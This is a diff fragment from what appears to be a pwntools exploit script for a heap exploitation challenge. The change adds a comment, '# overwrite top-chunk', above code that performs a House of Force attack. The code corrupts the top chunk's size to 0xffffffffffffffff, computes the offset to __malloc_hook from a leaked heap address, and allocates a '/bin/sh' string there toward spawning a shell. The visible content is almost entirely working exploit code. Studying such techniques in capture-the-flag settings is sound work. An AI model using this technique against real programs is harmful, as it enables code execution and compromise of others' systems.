@@ -35,6 +35,7 @@ heap = int(io.recvline(), 16)
 io.recvuntil(b"> ")
 io.timeout = 0.1
 
+# overwrite top-chunk
 malloc(24, b"A"*24 + p64(0xffffffffffffffff))
 distance = (libc.sym.__malloc_hook-0x20) - (heap+0x20)
 malloc(distance, b'/bin/sh\0')
